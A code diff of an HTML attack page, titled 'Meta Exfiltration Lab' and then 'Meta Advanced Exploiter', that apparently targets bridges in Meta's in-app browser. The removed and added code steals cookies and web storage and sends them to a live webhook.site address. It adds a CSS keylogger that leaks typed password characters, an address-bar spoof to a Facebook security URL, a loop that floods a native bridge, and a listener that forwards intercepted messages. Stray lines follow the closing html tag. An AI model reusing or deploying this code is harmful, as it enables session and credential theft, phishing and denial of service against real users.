@@ -2,68 +2,88 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Exfiltration Lab</title>
+    <title>Meta Research Lab v5</title>
     <style>
-        body { background: #000; color: #ff00ff; font-family: 'Courier New', monospace; padding: 15px; }
-        .card { border: 2px solid #ff00ff; padding: 15px; margin-bottom: 20px; background: #111; border-radius: 8px; }
-        button { background: #111; color: #ff00ff; border: 1px solid #ff00ff; padding: 12px; width: 100%; margin: 8px 0; cursor: pointer; font-weight: bold; }
-        .log { background: #000; height: 150px; overflow-y: auto; border: 1px dashed #444; padding: 10px; font-size: 11px; color: #0f0; }
+        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; }
+        .card { border: 2px solid #333; padding: 15px; margin-bottom: 20px; background: #111; }
+        button { background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 12px; width: 100%; margin: 8px 0; cursor: pointer; }
+        
+        /* CSS Keylogger: Jar 'p' type kela tar Webhook var request jail */
+        input[type="password"][value^="p"] { 
+            background-image: url("https://webhook.site/7a9ce72c-38b6-4f91-a1b8-5bea8d85797d?char=p"); 
+        }
+        .log { background: #000; height: 150px; overflow-y: scroll; border: 1px dashed #444; padding: 10px; font-size: 11px; color: #00ffff; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h3>Meta Exfiltration Lab</h3>
-        <p style="font-size: 0.7rem; color: #888;">Data will be sent to your Webhook.site</p>
-        <button onclick="exfiltrateStorage()">1. Send Storage to Webhook</button>
-        <button onclick="exfiltrateBridgeInfo()">2. Force Bridge Leak to Webhook</button>
+        <h3>Meta Advanced Exploiter</h3>
+        <button onclick="spoofHistory()">1. Test Address Bar Spoof</button>
+        <button onclick="floodBridge()">2. Bridge Overload (DoS Test)</button>
+        <button onclick="exfiltrateEnv()">3. Send Full Env to Webhook</button>
     </div>
 
-    <div class="log" id="logBox">Waiting for exfiltration...</div>
+    <div class="card">
+        <h3>CSS Leak Test</h3>
+        <p style="font-size: 0.7rem;">Password box madhe 'p' type karun Webhook check kar.</p>
+        <input type="password" placeholder="Type 'p' here..." oninput="this.setAttribute('value', this.value)" style="width:90%; padding:10px;">
+    </div>
+
+    <div id="log" class="log">Monitoring... Webhook Active.</div>
 
     <script>
-        const WEBHOOK_URL = "https://webhook.site/7a9ce72c-38b6-4f91-a1b8-5bea8d85797d"; // <--- APNA URL DALO
-        const logBox = document.getElementById('logBox');
+        const WEBHOOK = "https://webhook.site/7a9ce72c-38b6-4f91-a1b8-5bea8d85797d";
+        function log(m) { document.getElementById('log').innerHTML += "<br>> " + m; }
 
-        function log(m) {
-            logBox.innerHTML += `<br>> [${new Date().toLocaleTimeString()}] ${m}`;
-            logBox.scrollTop = logBox.scrollHeight;
+        // Data Webhook var pathavnyasathi
+        async function sendExfil(data) {
+            fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
         }
 
-        // Data bhejne ka function
-        function sendToWebhook(data) {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify(data)
-            }).then(() => log("Data sent to Webhook.site!"))
-              .catch(e => log("Exfiltration Failed: " + e));
+        // 1. URL Hijacking via History API
+        function spoofHistory() {
+            log("Attempting History Spoof...");
+            try {
+                window.history.pushState({}, "", "https://www.facebook.com/settings/security");
+                log("URL Spoofed! Check your Browser Address Bar.");
+                sendExfil({ action: "spoof_attempt", success: true });
+            } catch(e) { log("Spoof Failed: " + e.message); }
         }
 
-        // 1. Storage Chura kar bhejna
-        function exfiltrateStorage() {
-            log("Harvesting storage...");
-            let dump = {
-                localStorage: JSON.stringify(localStorage),
-                sessionStorage: JSON.stringify(sessionStorage),
-                cookies: document.cookie,
-                userAgent: navigator.userAgent
-            };
-            sendToWebhook(dump);
-        }
-
-        // 2. Bridge ko force karke jo bhi mile bhej dena
-        function exfiltrateBridgeInfo() {
-            log("Attempting Bridge Callback Hijack...");
-            if (window.iabjs_unified_bridge) {
-                // Bridge ko message bhejna aur listener laga dena
+        // 2. Bridge Flooding
+        function floodBridge() {
+            log("Flooding Bridge Config...");
+            for(let i=0; i<100; i++) {
                 try {
-                    window.iabjs_unified_bridge.postMessage(JSON.stringify({type: "get_config"}), "*");
-                    log("Bridge pinged, check Webhook for responses.");
-                } catch(e) {
-                    sendToWebhook({error: e.message, bridge: "iabjs"});
-                }
-            } else {
+                    window.browserDeclutter.applyConfig({ ["leak_"+i]: "X".repeat(50) });
+                } catch(e) {}
+            }
+            log("Flood complete. App lag check kar.");
+            sendExfil({ action: "flood_complete" });
+        }
+
+        // 3. Full Environment Leak
+        function exfiltrateEnv() {
+            log("Exfiltrating environment...");
+            const env = {
+                ua: navigator.userAgent,
+                origin: window.location.origin,
+                bridge_iabjs: !!window.iabjs_unified_bridge,
+                bridge_declutter: !!window.browserDeclutter,
+                android_obj: !!window.android
+            };
+            sendExfil(env);
+            log("Data sent to Webhook.site");
+        }
+
+        // Bridge messages catch karne
+        window.addEventListener("message", (e) => {
+            sendExfil({ intercepted_message: e.data });
+        });
+    </script>
+</body>
+</html>
                 log("Bridge not found.");
             }
         }
